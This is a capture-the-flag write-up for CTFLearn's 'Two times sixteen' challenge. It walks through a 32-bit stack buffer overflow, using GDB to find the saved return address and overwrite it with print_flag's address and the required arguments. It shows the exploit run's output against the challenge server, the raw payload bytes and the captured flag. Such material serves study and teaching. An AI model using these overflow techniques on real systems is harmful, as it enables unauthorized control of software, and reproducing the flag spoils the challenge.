# Two times sixteen

Looking at `task.c`, we see that `print_flag` gates access to the flag behind two if expressions: `p1 == -1337` and `p2 == 0xC0FFEE`. `print_flag`, in turn, is called from `vuln`. In `vuln`, we see a potential security flaw. Although the `read` command restricts the input to avoid a buffer overflow attack, the input size being read, 64, is greater than the size of the character buffer, 32. This means that we can write into the stack beyond the size of the buffer.

NOTE: The `task` executable is a 32-bit ELF. To run the file on my Windows Subsystem Linux, I had to run:
```
sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt-get install gcc-multilib
sudo apt-get install libc6-i386
ln -sf /lib/i386-linux-gnu/libc.so.6 ./libc.so.6
ln -sf /lib/i386-linux-gnu/ld-linux.so.2 ./ld-linux.so.2
```
I am leaving these commands as 32-bit systems are uncommon and this may be useful for ome readers. The last two lines were necessary due to quirks in the dynamic linking of the executable.

We create a test `flag.txt` with:
```
touch flag.txt
echo "Success!" > flag.txt
```

Running `task` with GDB, we find that `task` has been compiled without debugging symbols, meaning that we can't directly view variables. However, we can track the stack right before calling `print_flag`:
```
gdb-peda$ x/40x $sp
0xffffc810:     0xff    0xff    0xff    0xff    0x02    0x00    0x00    0x00
0xffffc818:     0x40    0x00    0x00    0x00    0xbb    0x92    0x04    0x08
0xffffc820:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffc828:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffc830:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
```
In this case, I entered a series of 'a's, which appear from `0xffffc820` onwards. We can see -1 (`0xffffffff`) for `p1 = -1` at `0xffffc810` and `p2 = -2` immediately afterwards. This means that we won't be able to directly overwrite the `p1` and `p2` values. Instead, we will have to overwrite the return address. To do so, we run:
```
gdb-peda$ info frame
Stack level 0, frame at 0xffffc850:
 eip = 0x80492ed in vuln; saved eip = 0x8049348
 called by frame at 0xffffc870
 Arglist at 0xffffc848, args:
 Locals at 0xffffc848, Previous frame's sp is 0xffffc850
 Saved registers:
  ebx at 0xffffc844, ebp at 0xffffc848, eip at 0xffffc84c
```
We get `eip at 0xffffc84c`, so we will need to overwrite the value at `0xffffc84c`. Our input starts at `0xffffc820`, so we need 44 hex values, followed by our new return value. The new return value will have to be `0x080491d6`, which `disas print_flag` tells us is the start of `print_flag`. We also need to insert our two arguments, -1337 and `0xC0FFEE`. The payload construction and delivery is in `payload.py`, written after a bit of experimentation to figure out how to overwrite the parameters. Some of the experimentation is in `debug.py`.

Running the script `payload.py` yields:
```
$ python payload.py
[*] '/mnt/c/Users/Brian/Documents/Coding/CTFLearn/Easy/Two times sixteen/task/task'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8046000)
    RUNPATH:    b'.'
    Stripped:   No
[+] Opening connection to rivit.dev on port 10000: Done
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Ö\x04\x08\x00\x00\x00\x00ÇúÿÿîÿÀ\x00
/mnt/c/Users/Brian/Documents/Coding/CTFLearn/Easy/Two times sixteen/task/payload.py:18: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.recvuntil("Do you want to say something?")
/mnt/c/Users/Brian/Documents/Coding/CTFLearn/Easy/Two times sixteen/task/payload.py:19: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  conn.sendline(payload)
[+] Receiving all data: Done (157B)
[*] Closed connection to rivit.dev port 10000
output b'\nYou passed the following arguments:\np1 = -1\np2 = 0x2\nYou passed the following arguments:\np1 = -1337\np2 = 0xC0FFEE\nCTFlearn{h3yyy_n0w_y0u_h4v3_7h3_c0n7r0l}\n\n'
```

So, our flag is `CTFlearn{h3yyy_n0w_y0u_h4v3_7h3_c0n7r0l}`.